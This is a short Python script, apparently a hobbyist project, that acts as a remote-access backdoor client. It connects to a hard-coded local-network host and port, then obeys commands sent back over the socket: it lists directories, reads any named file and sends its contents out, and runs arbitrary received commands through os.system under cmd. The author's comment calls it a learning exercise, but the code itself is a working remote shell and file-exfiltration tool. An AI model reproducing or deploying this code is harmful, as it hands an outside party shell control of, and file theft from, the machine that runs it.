import socket
import random
import time
import string
import os

#To lazy to explain this one go take a look by urself NERD btw i suck at networking so yeah and also 90% of my git repository is private cause i dont like people roasting me cause i have anxiety thanks for your time <3 idk if this is useful but i had a dopamine rush when i connected to my local device and transfered a file cause i did it AYYYYYYYY aight cya




server_bind_IPv4 = "192.168.100.3"
server_bind_Port = 6060
server_encoding = "utf-8"
server_binding_address = (server_bind_IPv4 , server_bind_Port)

#

#Socket Settings
sock = socket.socket()
local_host_server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
local_host_server.connect(server_binding_address)



def Connect_to_host():
	while True:
		command = local_host_server.recv(1024).decode(server_encoding)

		if command == "getcwd":
			return_value = os.getcwd()
			return_value = str(return_value)
			local_host_server.send(return_value.encode())

		if command == "cd":
			costum_path_input = local_host_server.recv(1024).decode(server_encoding)
			return_value = os.listdir(costum_path_input)
			return_value = str(return_value)
			local_host_server.send(return_value.encode())

		if command == "mwfile":
			local_file_path = local_host_server.recv(1024).decode(server_encoding)
			file_byte = open(local_file_path,"rb")
			data = file_byte.read()
			local_host_server.send(data)

		if command == "shellaccess":
			while True:
				shell_name = (socket.gethostname())
				local_host_server.send(shell_name.encode())
				shell_acces_commands = local_host_server.recv(1024).decode(server_encoding)
				os.system(f'cmd /k "{shell_acces_commands}"')



	
Connect_to_host()